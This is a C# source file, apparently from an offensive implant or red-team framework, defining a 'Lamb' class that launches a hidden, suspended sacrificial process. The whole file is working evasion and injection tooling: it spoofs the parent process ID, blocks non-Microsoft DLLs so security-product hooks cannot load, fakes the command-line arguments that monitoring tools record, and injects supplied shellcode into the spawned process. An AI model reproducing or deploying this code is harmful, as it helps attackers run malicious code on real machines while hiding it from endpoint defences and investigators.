using DemoApp.Deception;
using DemoApp.Injection;

using Microsoft.Win32.SafeHandles;

using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

using DemoApp.DInvoke;

namespace DemoApp.Sacrificial
{
    public class Lamb
    {
        private readonly int _ppid;
        private readonly bool _blockDlLs;

        private string _command;
        private string _fakeArgs;
        private string _realArgs;

        public Lamb(int ppid, bool blockDlLs = true)
        {
            _ppid = ppid;
            _blockDlLs = blockDlLs;
        }

        public string Run(string command, string fakeArgs, string realArgs)
        {
            _command = command;
            _fakeArgs = command + " " + fakeArgs;
            _realArgs = command + " " + realArgs;

            var pi = Sacrifice(out var readPipe);

            var mole = new Mole(pi, _realArgs);
            mole.SpoofArgs();

            return ReadFromPipe(pi, readPipe);
        }

        public string Shell(string fakeArgs, string realArgs)
        {
            _command = @"C:\Windows\System32\cmd.exe";
            _fakeArgs = fakeArgs;
            _realArgs = realArgs;

            var pi = Sacrifice(out var readPipe);

            var mole = new Mole(pi, _realArgs);
            mole.SpoofArgs();

            return ReadFromPipe(pi, readPipe);
        }

        public string Inject(string spawnTo, string fakeArgs, byte[] shellcode)
        {
            _command = spawnTo;
            _fakeArgs = fakeArgs;
            
            var pi = Sacrifice(out var readPipe);

            var mole = new Mole(pi, _realArgs);
            mole.SpoofArgs();

            var needle = new Needle(pi);
            needle.Inject(shellcode);

            return ReadFromPipe(pi, readPipe);
        }

        private Data.Win32.PROCESS_INFORMATION Sacrifice(out IntPtr readPipe, bool createSuspended = false)
        {
            // Setup handles
            var hSa = new Data.Win32.SECURITY_ATTRIBUTES();
            hSa.nLength = (uint)Marshal.SizeOf(hSa);
            hSa.bInheritHandle = true;

            var hStdOutRead = IntPtr.Zero;
            var hStdOutWrite = IntPtr.Zero;
            var hDupStdOutWrite = IntPtr.Zero;

            // Create pipe
            Win32.CreatePipe(
                ref hStdOutRead,
                ref hStdOutWrite,
                ref hSa,
                0);

            Win32.SetHandleInformation(
                hStdOutRead,
                Data.Win32.HandleFlags.Inherit,
                0);

            // Initialise Startup Info
            var siEx = new Data.Win32.STARTUPINFOEX();
            siEx.Startupinfo.cb = (uint)Marshal.SizeOf(siEx);
            siEx.Startupinfo.dwFlags = Data.Win32.STARTF_USESHOWWINDOW | Data.Win32.STARTF_USESTDHANDLES;
            siEx.Startupinfo.wShowWindow = Data.Win32.SW_HIDE;

            var lpValueProc = IntPtr.Zero;

            try
            {
                var lpSize = IntPtr.Zero;
                var dwAttributeCount = _blockDlLs ? 2 : 1;

                Win32.InitializeProcThreadAttributeList(
                    IntPtr.Zero,
                    dwAttributeCount,
                    ref lpSize);

                siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);

                Win32.InitializeProcThreadAttributeList(
                    siEx.lpAttributeList,
                    dwAttributeCount,
                    ref lpSize);

                // BlockDLLs
                if (_blockDlLs)
                {
                    var lpMitigationPolicy = Marshal.AllocHGlobal(IntPtr.Size);

                    Marshal.WriteInt64(
                        lpMitigationPolicy,
                        Data.Win32.PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
                    );

                    Win32.UpdateProcThreadAttributeList(
                        siEx.lpAttributeList,
                        (IntPtr)Data.Win32.PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
                        lpMitigationPolicy);
                }

                var hParent = Process.GetProcessById(_ppid).Handle;

                // PPID spoof
                lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);

                Marshal.WriteIntPtr(
                    lpValueProc,
                    hParent
                );

                Win32.UpdateProcThreadAttributeList(
                    siEx.lpAttributeList,
                    (IntPtr)Data.Win32.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    lpValueProc);

                // Duplicate handles
                using var self = Process.GetCurrentProcess();

                Win32.DuplicateHandle(
                    self.Handle,
                    hStdOutWrite,
                    hParent,
                    ref hDupStdOutWrite,
                    0,
                    true,
                    Data.Win32.DuplicateOptions.DuplicateCloseSource | Data.Win32.DuplicateOptions.DuplicateSameAccess);

                siEx.Startupinfo.hStdError = hDupStdOutWrite;
                siEx.Startupinfo.hStdOutput = hDupStdOutWrite;

                // Start Process
                Win32.CreateProcess(
                    _command,
                    _fakeArgs,
                    Data.Win32.EXTENDED_STARTUPINFO_PRESENT | Data.Win32.CREATE_NO_WINDOW | Data.Win32.CREATE_SUSPENDED,
                    siEx,
                    out var pi);

                readPipe = hStdOutRead;
                return pi;
            }
            finally
            {
                // Free attribute list
                Win32.DeleteProcThreadAttributeList(siEx.lpAttributeList);
                Marshal.FreeHGlobal(siEx.lpAttributeList);
                Marshal.FreeHGlobal(lpValueProc);
            }
        }

        private static string ReadFromPipe(Data.Win32.PROCESS_INFORMATION pi, IntPtr readPipe)
        {
            var hSafe = new SafeFileHandle(readPipe, false);
            var fileStream = new FileStream(hSafe, FileAccess.Read);

            var result = new StringBuilder();

            using (var reader = new StreamReader(fileStream))
            {
                var exit = false;

                try
                {
                    do
                    {
                        // Has process has signaled to exit?
                        if (Win32.WaitForSingleObject(pi.hProcess, 100) == 0)
                        {
                            exit = true;
                        }

                        // Get number of bytes in the pipe waiting to be read
                        uint bytesToRead = 0;
                        Win32.PeekNamedPipe(readPipe, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref bytesToRead, IntPtr.Zero);

                        // If there are no bytes and process has closed, let's bail
                        // If this evaluates to false, we automatically loop again
                        if (bytesToRead == 0 && exit)
                        {
                            break;
                        }

                        // Otherwise, read from the pipe
                        var buf = new char[bytesToRead];
                        reader.Read(buf, 0, buf.Length);
                        result.Append(new string(buf));

                    } while (true);
                }
                finally
                {
                    hSafe.Close();
                }
            }

            // Close remaining handles
            Win32.CloseHandle(readPipe);
            Win32.CloseHandle(pi.hProcess);
            Win32.CloseHandle(pi.hThread);

            // Return result
            return result.ToString();
        }
    }
}